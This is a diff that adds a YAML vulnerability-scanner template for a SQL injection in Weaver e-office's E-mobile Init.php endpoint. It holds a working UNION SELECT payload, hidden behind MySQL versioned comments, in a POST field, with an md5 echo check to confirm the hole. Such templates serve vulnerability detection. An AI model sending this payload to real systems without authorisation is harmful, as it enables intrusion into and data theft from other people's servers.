@@ -1,0 +1,12 @@
+name: weaver-ecology-e-office-getselectlist-crm-sqli
+set:
+  randInt: randomInt(60000, 66800)
+rules:
+  - method: POST
+    path: "/E-mobile/App/Init.php?m=getSelectList_Crm"
+    body: |
+      cc_parent_id=-999 /*!50000union*/ /*!50000select*/ 1,md5({{randInt}})#
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(md5(string(randInt))))
+detail:
+  author: 666
